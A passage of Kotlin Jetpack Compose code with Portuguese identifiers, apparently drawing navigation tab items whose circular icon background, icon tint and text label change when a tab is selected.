                        .size(width = 40.dp, height = 28.dp)
                        .clip(CircleShape)
                        .background(
                            if (selecionada) Color.White.copy(alpha = 0.92f)
                            else Color.Transparent,
                        ),
                    contentAlignment = Alignment.Center,
                ) {
                    Icon(
                        imageVector = aba.icone,
                        contentDescription = null,
                        tint = if (selecionada) Color(0xFF111418) else Color.White.copy(alpha = 0.82f),
                        modifier = Modifier.size(22.dp),
                    )
                }
                Text(
                    text = if (aba == Aba.Comunidade) "Social" else aba.titulo,
                    color = if (selecionada) Color.White else Color.White.copy(alpha = 0.74f),
                    fontWeight = if (selecionada) FontWeight.Bold else FontWeight.Medium,
                    fontSize = if (abasVisiveis.size > 6) 9.sp else 10.sp,
                    maxLines = 1,
                    softWrap = false,
                )
            }
        }
    }
}
